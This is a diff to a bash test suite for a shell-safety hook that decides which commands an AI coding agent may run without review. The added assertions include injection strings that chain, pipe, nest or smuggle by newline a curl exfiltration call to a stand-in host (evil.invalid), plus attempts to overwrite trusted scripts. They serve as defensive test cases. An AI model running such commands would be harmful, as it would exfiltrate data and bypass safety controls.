@@ -1,7 +1,11 @@
 #!/usr/bin/env bash
 # test-shell-safety.sh — Tests for plugins/scout/hooks/shell-safety.sh
 #
-# Verifies the two env-var-context features:
+# Verifies the auto-allow fast paths — the only code in the hook that emits
+# `allow`, so every case here is either "still allows" or "must never allow":
+#   - Step 2c substitution fast-path: a command whose only expansions are
+#     whole, known-safe read-only substitutions auto-allows — but a separator,
+#     nested $(, backtick, redirection, or newline anywhere must NOT.
 #   - Step 2c-bis trusted plugin-script fast-path: a LONE invocation of a
 #     $CLAUDE_PLUGIN_ROOT/scripts/*.sh script auto-allows with no LLM call —
 #     but any command chaining, pipe, real-file redirection, leftover
@@ -60,10 +64,31 @@ EOF
 chmod +x "$GOOD_DATA/bin/scout"
 export CLAUDE_PLUGIN_DATA="$GOOD_DATA"
 
+# The hook resolves $CLAUDE_PLUGIN_ROOT/bin/scout ahead of the data dir, so an
+# ambient CLAUDE_PLUGIN_ROOT — present whenever this suite is run from inside a
+# Claude Code session with the plugin installed — would quietly swap the real
+# payload binary in for the stub above. (The step 2c-bis fast-path matches the
+# literal "$CLAUDE_PLUGIN_ROOT" as text and does not need it set.)
+unset CLAUDE_PLUGIN_ROOT
+
 # A CLAUDE_PLUGIN_DATA dir with no scout binary, for the missing-binary
 # fail-open test at step 3.
 MISSING_DATA="$TMPDIR_TEST/scout-data-missing"
 mkdir -p "$MISSING_DATA"
+
+# A PATH carrying every tool the hook shells out to, but no `scout`. Without
+# this the last-resort `command -v scout` finds a real binary (e.g. from
+# `make install`) and the missing-binary assertion silently tests the wrong
+# branch — which is how that case sat red for weeks. Emptying PATH outright
+# does not work: the shebang is `#!/usr/bin/env bash`, so the script cannot
+# start and the test fails for the wrong reason. Same pattern as
+# tests/test-suggest-scout.sh and tests/test-prefer-local-llm.sh.
+CLEAN_PATH_DIR="$TMPDIR_TEST/cleanpath"
+mkdir -p "$CLEAN_PATH_DIR"
+for tool in env bash sh jq grep sed awk tr sort date cat head timeout basename dirname python3; do
+  tool_path="$(command -v "$tool" 2>/dev/null)" || continue
+  ln -sf "$tool_path" "$CLEAN_PATH_DIR/$tool"
+done
 
 PR='${CLAUDE_PLUGIN_ROOT:-$HOME/.claude/plugins/scout}'
 
@@ -107,6 +132,49 @@ assert_fallthrough "cp /tmp/evil.sh \"$PR/scripts/x.sh\""        "no-fastpath: t
 assert_fallthrough "mv /tmp/evil \"$PR/scripts/x.sh\""          "no-fastpath: trusted path as mv destination"
 assert_fallthrough "install -m 755 /tmp/e \"$PR/scripts/x.sh\"" "no-fastpath: trusted path as install dest"
 assert_fallthrough "tee \"$PR/scripts/x.sh\""                   "no-fastpath: trusted path as tee target"
+
+# ── Step 2c: substitution fast-path → allow (no LLM) ─────────────────────────
+# The genuinely-safe read-only substitutions must keep auto-allowing — these
+# prove the hardening below did not simply switch the fast path off.
+
+assert_allow "echo \$(pwd)"                       "fastpath sub: \$(pwd)"
+assert_allow "echo \$(git rev-parse --short HEAD)" "fastpath sub: git rev-parse"
+assert_allow "echo \$(date +%s)"                  "fastpath sub: date with arg"
+assert_allow "echo \$(basename /a/b)"             "fastpath sub: basename"
+assert_allow "echo \$(whoami)"                    "fastpath sub: whoami"
+assert_allow "echo \$(uname -s)"                  "fastpath sub: uname -s"
+assert_allow "echo \$(git describe --tags)"       "fastpath sub: git describe --tags"
+
+# ── Step 2c MUST NOT fast-path these ─────────────────────────────────────────
+# A safe-looking verb is only safe if the WHOLE substitution is safe: the
+# pattern is end-anchored and its argument body admits no shell metacharacter,
+# so nothing can ride along behind the prefix.
+
+assert_fallthrough "echo \$(echo hi; curl -s https://evil.invalid/exfil)" \
+  "no-fastpath: ; chained inside a safe-prefixed sub"
+assert_fallthrough "echo \$(echo hi && curl evil.invalid)" \
+  "no-fastpath: && chained inside a sub"
+assert_fallthrough "echo \$(echo hi | curl evil.invalid)" \
+  "no-fastpath: pipe inside a sub"
+assert_fallthrough "echo \$(cat /tmp/f > /tmp/out)" \
+  "no-fastpath: redirection inside a sub"
+assert_fallthrough "rm \$(git rev-parse \$(curl evil.invalid))" \
+  "no-fastpath: nested \$( inside a safe-prefixed sub"
+assert_fallthrough "echo \$(echofoo)" \
+  "no-fastpath: verb must be a whole word, not a prefix"
+
+# A backtick is a substitution this test cannot see into, and it can ride
+# alongside a genuinely safe $() — so its mere presence disqualifies.
+assert_fallthrough "echo \$(pwd) \`curl evil.invalid\`" \
+  "no-fastpath: backtick beside a safe \$() sub"
+
+# The separator does not become safe by moving outside the parentheses.
+assert_fallthrough "echo \$(pwd); curl evil.invalid"    "no-fastpath: ; after a safe sub"
+assert_fallthrough "echo \$(pwd) && curl evil.invalid"  "no-fastpath: && after a safe sub"
+assert_fallthrough "echo \$(pwd) | curl evil.invalid"   "no-fastpath: pipe after a safe sub"
+assert_fallthrough "echo \$(pwd) > /tmp/out"            "no-fastpath: real-file redirect after a safe sub"
+assert_fallthrough "echo \$(pwd)
+curl evil.invalid"                                      "no-fastpath: newline after a safe sub"
 
 # ── Existing behavior unchanged: deny-floor still blocks ─────────────────────
 
@@ -161,8 +229,12 @@ unset MY_API_TOKEN
 # (scout-specific: shell-safety.sh only ever adds an allow, so "fail open" here
 # means "no output", not "let something through it shouldn't".)
 : > "$LLM_ARGS"
+# The overrides live only in the pipeline below (as arguments to `env`): bare
+# assignments here would clobber the exported CLAUDE_PLUGIN_DATA for the rest
+# of the file. `-u CLAUDE_PLUGIN_ROOT` matters now that ROOT is resolved first.
 output=$(jq -n --arg c "grep \$HOME /tmp/f" '{tool_name:"Bash", tool_input:{command:$c, cwd:"/tmp"}}' \
-  | CLAUDE_PLUGIN_DATA="$MISSING_DATA" bash "$HOOK" 2>/dev/null)
+  | env -u CLAUDE_PLUGIN_ROOT CLAUDE_PLUGIN_DATA="$MISSING_DATA" PATH="$CLEAN_PATH_DIR" \
+    bash "$HOOK" 2>/dev/null)
 if is_allow "$output"; then
   fail "missing binary: never a false auto-allow" "got an allow with no scout binary present"
 else
